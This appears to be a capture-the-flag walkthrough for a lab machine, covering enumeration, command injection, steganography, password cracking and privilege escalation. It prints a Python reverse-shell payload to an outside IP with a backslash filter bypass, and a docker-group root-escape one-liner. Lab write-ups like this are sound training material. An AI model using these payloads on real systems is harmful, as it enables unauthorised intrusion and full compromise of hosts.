A port scan shows 22, 21 and 80 are open

I browsed to the web page and didnt find anything

Running gobuster found a /secrets directory

Going to that shows a search bar with an execute function

Trying commands like whoami and id work, but you cannot do much else here

I intercepted the execute function with burp, sent it to the repeater and added the following to the bottom of the text:
command=p\ython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.24.197,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

This will give you a reverse shell

Checking /var/www/files/images, you will find a jpg and gif.

Spin up a python3 http server and wget these down

use 'steghide extract -sf hacker-with-laptop_23-2147985341.jpg' to get a backup.zip

Since the .zip file is protected, use zip2john to generate something john can crack

Use the password to unzip the file and find source_code.php

Open this up and you will find a base64 string that you can decode

SSH as anurodh with the newly found password

run 'id' and see that they are part of the docker group

GTFObins shows you can run the following to get a root shell:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

As root, you can cat out the root flag in /root and the local.txt flag in /home/apaar
